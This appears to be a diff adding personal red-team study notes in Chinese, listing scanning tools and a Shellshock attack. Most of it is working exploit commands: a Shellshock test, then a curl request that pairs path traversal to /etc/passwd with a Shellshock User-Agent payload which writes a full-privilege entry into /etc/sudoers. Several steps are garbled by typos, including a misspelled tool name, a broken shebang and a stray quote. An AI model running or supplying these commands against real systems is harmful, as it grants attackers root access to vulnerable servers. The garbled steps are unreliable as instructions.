@@ -1,0 +1,17 @@
+searchspoit 寻找漏洞网络框架
+
+nikto -host ip 
+
+jaeles
+
+shareshock漏洞
+查看bash的版本较低<4.3可以使用（bash -version)
+在低级的用户中输入
+env x='() { :; }; echo "it is vul"' bash -c data
+出现it is vul就可以利用
+然后创建
+echo "#bin/bash" >> RedteamNotes.cgi
+chmod +x RedteamNotes.cgi
+在Perl文件（etc/bin/perl)中查看使用的具体过程
+使用curl 在文件头使用RedteamNotes.cgi
+sudo curl http://ip:port//unauthenticatead/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/..%01/etc/passwd -A '() { :; }; /bin/echo 用户名 ALL=(ALL)ALL' >> /etc/sudoers'
